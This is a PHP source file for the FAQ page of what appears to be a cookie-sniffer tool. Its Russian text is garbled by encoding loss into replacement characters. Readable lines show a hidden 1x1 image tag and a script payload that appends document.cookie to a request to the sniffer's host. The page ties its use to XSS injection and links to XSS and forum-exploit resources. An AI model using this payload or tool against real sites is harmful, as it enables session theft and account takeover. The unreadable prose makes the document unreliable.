<?
define("FILE", "faq.php");

require "config.php";

if ($styles_enabled) {
	if ($_GET['style'] and file_exists("styles/".$_GET['style'].".css")) $style_filename = $_GET['style'].".css";
		elseif ($_COOKIE['s_style'] and file_exists("styles/".$_COOKIE['s_style'].".css")) $style_filename = $_COOKIE['s_style'].".css";
	$current_style = substr($style_filename, 0, strpos($style_filename, ".css"));
	setcookie("s_style", $current_style, time()+7776000);
}
?>
<html>
<head>
<title>������� - FAQ</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<link rel="stylesheet" type="text/css" href="styles/<?=$style_filename?>">
</head>

<body>
<p>
1. <a href="#use">������������� ��������</a><br>
2. <a href="#interface">��������� � ���������</a><br>
3. <a href="#bugs">���������</a><br>
4. <a href="#contacts">�������� �����</a><br>
</p>
<p>----------------------------------------</p>
<p><a name="use"></a><b>1. ������������� ��������</b></p>
<p><b class="col">Q: ����� ��� ����� ���������� ��&nbsp;��������, ����� ������� ���������� ������ ������������?</b></p>
<p><b>A:</b> ����� ����������� IP, USER-AGENT ������������ �&nbsp;URL, �&nbsp;�������� ��� ������ �������, ���������� ���������� ��&nbsp;�������� ��� <code>&lt;img&gt;</code>, �&nbsp;������� ��������� ���� �&nbsp;����� <code><a href="s.gif" target="_blank">s.gif</a></code>, �������������� �&nbsp;���������� ��������. ��� ���������� ���:<br>
<blockquote style="margin:8px 0 5px 8px; padding-left:4px; border-left:2px solid;">
<code>&lt;img src="[���� �&nbsp;<a href="s.gif" target="_blank">s.gif</a>]" width="1" height="1"&gt;</code>
</blockquote></p>
<p>���&nbsp;�� ������ ����� ���������, ���� ��&nbsp;������� �������� �&nbsp;�������� ����� ��������-��������. ������ ������������� ����������, �������� ����� �������� �&nbsp;������� ������������ ����������, ������� ��&nbsp;������ <code>?</code>. �&nbsp;���� ��� �������� �&nbsp;���� QUERY. ���� ��� ����� ����������� cookies ������������ ��� ���� ����������, ��������� ������ ��������, ��&nbsp;�������� ��� ������������� JavaScript. ������ ����, ���������������� cookies:<br>
<blockquote style="margin:8px 0 5px 8px; padding-left:4px; border-left:2px solid;">
<code>&lt;script&gt;img=new Image(); img.src="[���� � <a href="s.gif" target="_blank">s.gif</a>]?"+document.cookie;&lt;/script&gt;</code>
</blockquote>
</p>
<p>����������, ���� �&nbsp;��� ��� ������� ������� �&nbsp;��������, ��&nbsp;������� ��&nbsp;����������� ���������� ���, ���� ����������� ���������� ��� &laquo;��� ����&raquo; ����� ������ ����������. ��� ����� ����� ���� ���������, ��� ������������ ����������� �&nbsp;����������� ���� �������, ����� ��������� ��&nbsp;��� ����������� ���. ���������� ������ ���� ���������� XSS (Cross-Site Scripting).</p>
<p><b class="col">Q: ��� ��������� ��� ������������� XSS-�����������? ����� ����������� ���������� ���������� ������ ������� ���� phpBB, vBulletin, IPB?</b></p>
<p><b>A:</b> ��������, �����:
<li><a href="http://antichat.ru/crackchat/HTML/" target="_blank">���������� ��&nbsp;XSS</a> (Antichat.ru)</li>
<li><a href="http://ha.ckers.org/xss.html#XSScalc" target="_blank">XSS �&nbsp;�������� + Character Encoding Calculator + IP Obfuscation Calculator</a> (ha.ckers.org)</li>
<li><a href="http://www.securitylab.ru/search/index.php?q=phpBB&where=iblock_vulnerability" target="_blank">���������� phpBB</a> (SecurityLab.ru)</li>
<li><a href="http://www.securitylab.ru/search/index.php?q=vBulletin&where=iblock_vulnerability" target="_blank">���������� vBulletin</a> (SecurityLab.ru)</li>
<li><a href="http://www.securitylab.ru/search/index.php?q=Invision+Power+Board&where=iblock_vulnerability" target="_blank">���������� Invision Power Board</a> (SecurityLab.ru)</li></p>
<p><b class="col">Q: ��&nbsp;������ �������� �������� �������?</b></p>
<p><b>A:</b> ��� ������ �������� �������� ������ ��&nbsp;�������� ������������, ����������� php-���, ���������� �&nbsp;��������, ����������� �&nbsp;������������ ���������� ��&nbsp;������� ������ �&nbsp;��������� ����. ����� ���� ������� ���������� �������� ���������� GIF-���� �������� 1&times;1&nbsp;�������� (<code><?=$image_filename?></code>), �&nbsp;���������� ������ ���������� �������� ����� ���. ����� ��������, ��� ��� ������� ���� ����� ���������� <code>.gif</code>, ��� ��������� ��� �������� �������, ������������ ������ ������ ��������, �&nbsp;��&nbsp;�������� ������ ���������� �&nbsp;������������.</p>
<p><b class="col">Q: ��� ���� ����� ������� &laquo;���������� ��������&raquo;?</b></p>
<p><b>A:</b> ��������� ��&nbsp;������ ����� ������������� ��� ��&nbsp;��������� �&nbsp;���, ��� ��������� ��������� �������� ����������. ��&nbsp;������ ������ �������, ��&nbsp;�������� ����� ����������� ������ ����� ������, �&nbsp;��� ��� ���������� ������ ����� �����������. ���������� ���� ������� ����: ������� ����� �������� ���� ��������� ��&nbsp;������ �������.</p>
<p><b class="col">Q: ��� ������� ���, ����� ������ ����������� GIF ������������ ��� ��������?</b></p>
<p><b>A:</b> �&nbsp;<code>config.php</code> ������ ������ �������� ���������� <code>$image_filename</code>.</p>

<p>----------------------------------------</p>
<p><a name="interface"></a><b>2. ��������� � ���������</b></p>
<p><b class="col">Q: ��� ��������� �������?</b></p>
<p><b>A:</b> ��� ��������� �������� &#151; �&nbsp;����� <code>config.php</code> (�&nbsp;�������������), �������� ��� �&nbsp;����� ��������� ���������.</p>
<p><b class="col">Q: ��� ����, ���� ����� �������� ����� ����� ������� �&nbsp;����?</b></p>
<p><b>A:</b> ���� �&nbsp;������� �������� Shift ��������� �������� ����� ��������� �������, ������ ������ (��� ����� ���������).</p>
<p><b class="col">Q: ��� ���� ����� ������� &laquo;��������� �������&raquo;?</b> <img src="img/wand.gif" width="17" height="16" border="0" alt="��������� �������" style="vertical-align:middle;"></p>
<p><b>A:</b> ��� ������� ��������� ������ ����� ��&nbsp;����, �&nbsp;�������� ������ ������ ��������, �&nbsp;�������������� cookies, ���������� �&nbsp;QUERY. ��� ����� ������, ��������. �&nbsp;������, ���� ��� ���������� ��� �������, ��&nbsp;������ ��������� ��&nbsp;�&nbsp;<code>config.php</code>.</p>
<p><b class="col">Q: �����&nbsp;�� �������� ���� ����� �&nbsp;�������?</b></p>
<p><b>A:</b> �����. ��� ����� ��&nbsp;������ ������� ���� CSS-���� �&nbsp;����� <code>styles</code>, �������� �������� ������� ��&nbsp;������ CSS. �������� ��������, ��� �&nbsp;������ ������ ����� ��� ������� ������� ������� ���������������� �������� �����.</p>
<p>----------------------------------------</p>
<p><a name="bugs"></a><b>3. ���������</b></p>
<p><b class="col">Q: ��������� ������: &laquo;��&nbsp;������� �������� ������ �&nbsp;[��� �����]&raquo;.</b></p>
<p><b>A:</b> ������� ����������� ���������� �&nbsp;<code><a href="readme.txt" target="_blank">readme.txt</a></code></p>
<p><b class="col">Q: �&nbsp;��������� ��� ����� ��&nbsp;�����, ��&nbsp;������� ��� ����� ��&nbsp;����� ��������. ��� ������?</b></p>
<p><b>A:</b> ��������� ���������:<br>
<li>����, ��&nbsp;������� ��&nbsp;�������������� �������, ������������ PHP �&nbsp;������ �&nbsp;������� (������, ������);</li>
<li>����, ��&nbsp;������� ��&nbsp;�������������� �������, ��������� ��� ������������ ����������� ���� <code>.htaccess</code>;</li>
<li>���� ����� 2&nbsp;��&nbsp;����������� ���� �&nbsp;��� ��� ���������� ��&nbsp;����, ������������ ���� <code>s.gif</code> �&nbsp;<code>s.php</code>&nbsp;&#151; ������� ����� �������� ��&nbsp;������ ������. ������, �&nbsp;���� ������ ����� �������� ������ ������ �&nbsp;<code><?=$data_filename?></code>, �&nbsp;������ �&nbsp;���������� <code>s.gif</code> �&nbsp;�������� ���� ������ �������������;</li>
<li>���� ������ ��� ����� ��&nbsp;����������, ���������� �������� ������ ���� ��� ���������� ��������. ��� �����: ������������� ���������� �������� �&nbsp;���������� PHP, �&nbsp;������� ������, ����� ������� ���������� ����� (�&nbsp;������ ������������ �������� �������� ��� ��&nbsp;��������). ��������, <a href="http://stpwebhosting.com/" target="_blank">stpwebhosting.com</a>.</li></p>
<p><b class="col">Q: ������ ����������� �&nbsp;���, ��&nbsp;��������� ��������� �&nbsp;����������� ��������.</b></li>
<p><b>A:</b> ���������, ��������&nbsp;�� �&nbsp;��� cookies �&nbsp;javascript. ���� ��������, ��&nbsp;������ �����������, ��������� ��&nbsp;����.</p>
<p><b class="col">Q: &laquo;��������� �������&raquo; �� ������ ��������� ���������� ��������...</b></p>
<p><b>A:</b> �&nbsp;��� �������� �����������. ���� ��� ��&nbsp;����, ��&nbsp;������ ��������� ��&nbsp;����, ������� URL ����������� �������������� ��������.</p>
<p><b class="col">Q: �� �������� ������� �����������.</b></li>
<p><b>A:</b> ��� ���� ������� ��&nbsp;�����. ���� ���� ��&nbsp;���������, ��� ������ ���� �&nbsp;�������.</p>
<p><b class="col">Q: ��&nbsp;�������� ������ ��&nbsp;e-mail.</b></li>
<p><b>A:</b> ������ �����, ������� <code>mail()</code> ������������� ����� ��������.</p>
<p><b class="col">Q: ��&nbsp;�������� ��������� ��&nbsp;ICQ.</b></li>
<p><b>A:</b> ���� ����� ������ ���������� ������� �����, ����� ����� ��������� ����� �����������. ���� ��������� ��&nbsp;������������ ������, �&nbsp;�&nbsp;���������� ��� �����&nbsp;&#151; ������ �����, ����� ������� ����. ��������� �&nbsp;ICQ-��������� ������������.</p>
<p>----------------------------------------</p>
<p><a name="contacts"></a><b>4. �������� �����</b></p>
<p><b class="col">Q: ��� �&nbsp;���� ���������?</b></p>
<p><b>A:</b> ��. <code><a href="readme.txt" target="_blank">readme.txt</a></code>.</p>
<p><a href="#">#</a></p>
</body>
</html>